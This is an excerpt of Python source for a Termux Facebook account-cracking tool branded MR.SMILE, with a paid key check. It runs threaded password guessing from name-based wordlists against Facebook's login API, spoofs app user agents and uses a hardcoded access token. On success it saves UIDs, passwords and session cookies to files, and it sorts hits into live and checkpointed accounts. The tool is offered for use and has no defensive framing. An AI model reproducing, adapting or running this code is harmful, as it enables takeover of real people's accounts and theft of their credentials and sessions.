...
os.system('xdg-open https://github.com/SHAJON-404?tab=repositories')
...
┌─────────────────────────────────────────────┐
│ [♤{S}] AU{R}TH:          MR.SM{Y}I{M}LE                 │
│ [♤] F{G5}AC{G5}EB{M}OO{Y}K:      MR.SM{S}I{R}LE                 │
│ [♤] ST{G}A{G1}TU{Y}S:        PR{G4}EM{A}IUM                  │
│ [♤] TO{R}OL{G1}TY{Y}PE.      FI{G4}LE{S}&{A}RAN{G5}DOM {R}CL{G1}ONI{M}NG      │
└─────────────────────────────────────────────┘
"""
...
def menu():   
    ...
    print(f'[★]゠{M}[2]{A} CONTACT OWNER [BD]')
    print(f'[★]゠{X2}[3]{X5} TOOLS[V][0.1]{G1}[PAID]')
    print(f'[★]゠{R}[4]{X} MACHINE EXIT')
    linex()
...
def _bd_():
    ...
    with Habib(max_workers=90) as sexy:
        ...
        for love in user:
            ...
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','first6','last6','first7','last7','first8','last8']
...
def amul():
 ...
 ua = random.choice(["[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"])+END
 return ua
 ###---- AUTO DEF
...
def _file_():
    global methods
    clear()
    print(f'[✓]{Y}゠[1]{Y} UPDATED M1 [BD] {G1}[{A}M1{G1}]{G1} ')
    print(f'[✓]{G4}゠[2]{S} UPDATED M2 [ALL COUNTRY] {G2}[{A}M2{G2}]{G1} ')
    print(f'[✓]{R}゠[3]{G4} UPDATED M3 [ALL COUNTRY] {G2}[{A}M3{G2}]{G1} ')
    linex()
    option = input(f'{G1}[{M}?{G3}]{G3} CHOICE TARGET {A}:{R} ')
    if option =='1':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{S}✓{G1}]{R} EXAMPLE {A}✓{Y} /sdcard/SMILE.txt');linex()
        self.file = input(f'{G1}[{Y}?{G2}]{M} FILE NAME {A}✓{G2} ')
        try:
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            biskut=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537866;FBDM/{density=1.75,width=720,height=1422};FBLC/uk_UA;FBRV/386490586;FBCR/KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A207F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
            sys.stdout.write(f"\r{S}[{M}SMILE-M1{M}]{R}-{G5}[{A}{loop}{G5}]{A}-{G1}[{G5}OK{G1}/{S}CP{S}]{G5}-{G1}[{G5}{len(oks)}{G1}/{Y}{len(cps)}{R}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{S}[{M}SMILE-M2{M}]{R}-{G5}[{A}{loop}{G5}]{A}-{G1}[{G5}OK{G1}/{S}CP{S}]{G5}-{G1}[{G5}{len(oks)}{G1}/{Y}{len(cps)}{R}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]); SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SMILEb};{ckkk}"
                    print(f"\r\r{G1}[SUCCESS] {sid} | {ps} ")
...
#__________________[ FILE METHOD M3 ]__________________#                
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{S}[{M}SMILE-M3{M}]{R}-{G5}[{A}{loop}{G5}]{A}-{G1}[{G5}OK{G1}/{S}CP{S}]{G5}-{G1}[{G5}{len(oks)}{G1}/{Y}{len(cps)}{R}] ")
            sys.stdout.flush()
            ...
            #######m3####
            uaxx =   f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/468774617;FBDM/{density=3.0,width=1080,height=2076};FBLC/it_IT;FBRV/470537983;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
            ######
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]); SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SMILEb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSMILE-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    open('/sdcard/AJ-M3-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [SMILE-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SMILE/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{M}[{Y}✓{M}]{S} EXAMPLE {G5}:{Y} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{Y}[{M}?{Y}]{S} PASSWORD LIMIT {S}:{G5} '))
            clear()
            ...
            clear()
            print(f'{R}[{S}✓{Y}]{M} TOTAL FILE UID {R}:{S} %s ' % len(self.id))
            print(f'{S}[{Y}✓{R}]{G} PASSWORD LIMIT {R}:{G5} {sl} ')
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SMILE-RANDOM{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]',
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f'\r\r\x1b[1;97m[\x1b[1;92mSUCCESS\x1b[1;97m]\x1b[1;92m-\x1b[1;97m[😁\x1b[1;97m]\x1b[1;92m {uid} \x1b[1;97m|\x1b[1;92m {pas}')
                ...
                if res == 'LOCK':
                    print(f'\r\r\x1b[1;91m[\x1b[1;94mSMAILE-CP\x1b[1;91m]\x1b[1;94m {uid} \x1b[1;97m|\x1b[1;94m {pas}');break
            else:
                continue
        loop+=1
    except Exception as e:
...
def apv():
    url="https://raw.githubusercontent.com/MrSmile404/MR-SMILE-/main/App.txt"
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
    ...
    if num_key in datax:
        ...
        print(" !! Key - "+num_key)
        os.system("termux-open https://wa.link/1qosnc")
        sys.exit()
